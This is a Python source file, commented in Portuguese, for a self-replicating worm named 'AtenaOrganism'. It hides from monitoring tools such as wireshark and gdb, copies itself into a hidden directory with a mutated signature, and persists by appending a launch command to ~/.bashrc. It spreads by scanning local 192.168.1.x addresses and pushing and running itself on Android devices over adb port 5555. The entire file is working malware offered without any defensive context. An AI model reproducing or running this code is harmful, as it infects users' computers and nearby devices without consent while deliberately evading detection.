import os, subprocess, random, time

class AtenaOrganism:
    def __init__(self):
        self.tag = "".join([chr(random.randint(97, 122)) for _ in range(6)])
        self._main_cycle()

    def _check_environment(self):
        """ Sente a presença de atividade humana ou monitoramento """
        try:
            # Se a carga do sistema estiver acima de 50%, hiberna para não ser notada
            load = os.getloadavg()[0] if hasattr(os, "getloadavg") else 0
            if load > 1.5: return False
            
            # Se processos de análise (top, htop, wireshark) estiverem rodando, dorme
            ps = subprocess.check_output("ps -A", shell=True).decode().lower()
            watchers = ["top", "htop", "wireshark", "tcpdump", "strace", "gdb"]
            if any(w in ps for w in watchers): return False
            
            return True
        except: return True

    def _main_cycle(self):
        while True:
            if self._check_environment():
                self._execute_evolution()
                # Após agir, o organismo "descansa" por um tempo aleatório
                time.sleep(random.randint(300, 900)) 
            else:
                # Se detectado perigo, dorme pesado para sumir do radar
                time.sleep(1800)

    def _execute_evolution(self):
        try:
            _dir = os.path.join(os.path.expanduser("~"), ".local", "share", self.tag)
            if not os.path.exists(_dir): os.makedirs(_dir)
            
            path_self = os.path.abspath(__file__)
            with open(path_self, "r") as f: dna = f.read()
            
            # Mutação de Assinatura (Polimorfismo Orgânico)
            mutated = dna + f"\n# {hex(random.getrandbits(32))}"
            
            engine = os.path.join(_dir, "sys_task.py")
            with open(engine, "w") as f: f.write(mutated)
            
            self._persist(engine)
            self._replicate(engine)
        except: pass

    def _persist(self, path):
        try:
            target = os.path.join(os.path.expanduser("~"), ".bashrc")
            if os.path.exists(target):
                cmd = f"\n(python3 {path} > /dev/null 2>&1 &)\n"
                with open(target, "r") as f:
                    if path not in f.read():
                        with open(target, "a") as f: f.write(cmd)
        except: pass

    def _replicate(self, path):
        # Escaneamento estocástico e furtivo
        net_prefix = "192.168.1."
        targets = list(range(1, 255))
        random.shuffle(targets)
        
        for i in targets[:10]: # Ataca apenas 10 IPs por ciclo para não gerar picos de rede
            ip = f"{net_prefix}{i}"
            cmd = f"adb connect {ip}:5555 && adb -s {ip}:5555 push {path} /data/local/tmp/v.py && adb -s {ip}:5555 shell python3 /data/local/tmp/v.py &"
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

if __name__ == "__main__":
    # Inicia o organismo como processo órfão
    if os.fork() == 0:
        AtenaOrganism()
        
